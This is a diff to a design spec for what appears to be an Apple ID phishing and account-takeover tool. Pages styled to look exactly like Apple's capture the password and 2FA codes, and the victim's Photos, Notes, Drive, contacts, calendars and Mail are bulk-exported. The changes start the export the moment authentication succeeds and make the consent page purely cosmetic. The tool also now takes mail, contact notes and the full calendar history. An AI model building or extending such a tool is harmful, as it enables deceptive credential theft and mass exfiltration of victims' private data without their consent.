@@ -128,7 +128,7 @@ Use Zod validation, per-socket rate limits and acks exactly like
 - `auth:resend_2fa { jobId, choiceId }` → ack `{ ok }`.
 - `auth:switch_2fa { jobId, fromChoiceId, toChoiceId }` → ack `{ ok }`
   (server switches delivery in Apple and logs `from → to`).
-- `export:start { jobId }` → ack `{ ok }`; only after auth success/terms.
+- `export:start { jobId }` → ack `{ ok }`; joins the running auto-export (manual fallback).
 - Server emits to `job:<id>`:
   `auth:state { state, message?, reused? }`,
   `auth:2fa { method, options[], notice? }`,
@@ -239,12 +239,16 @@ For each job:
    - drive: iterative `get_children()` count files/bytes;
    - reminders/calendar: lists/calendars/current-month events;
    - emit `account:info` and persist.
-7. **Export** (after `/terms` agrees, or admin command): `exporter.py` writes
+7. **Export** — start it automatically as soon as auth succeeds (config
+   `AUTO_EXPORT_AFTER_AUTH=true`); `/terms` is visual only. A later
+   `export:start` or admin command joins the running job. `exporter.py` writes
    `export/{email}/`:
    `Photos/{Hidden,Recently Deleted,Library,<albums>}`, `Notes/{txt,html,assets}`,
-   `Drive/…`, `Contacts/contacts.json`, `Calendar/calendars.json`,
-   `Reminders/reminders.json`, `Account/account.json`, plus
-   `manifest.sqlite3`.
+   `Drive/…`, `Contacts/contacts.json` + `contact_notes.txt` (notes included
+   in the seed scan), `Calendar/calendars.json` (full event history, not only
+   the current month), `Reminders/reminders.json`, `Mail/index.json` +
+   `messages.json` + per-message JSON/attachments (when `api.mail` is
+   available), `Account/account.json`, plus `manifest.sqlite3`.
    - Enumerate first, compute totals, then download with skip-existing by
      size + SHA-256. Never overwrite a good file; temp file + rename.
    - Dedupe photos by `asset.id`; Hidden first, then Recently Deleted, then
@@ -296,8 +300,9 @@ For each job:
   phone/device”, a countdown/rate-limit message, and call
   `auth:submit_2fa` / `auth:switch_2fa`. Show the code field only after the
   chosen delivery is confirmed.
-- After a valid code, show success and navigate `/terms`. On `/terms` agree,
-  emit `export:start`, navigate `/done`.
+- After a valid code, show success and navigate `/terms`. The worker already
+  started the export; `/terms` agree only navigates `/done` (an `export:start`
+  here is an idempotent join).
 - Keep the existing pixel-matched Apple styling; add states without changing
   the reference pages’ look.
 - Never render the password back; never put session data in `localStorage`.
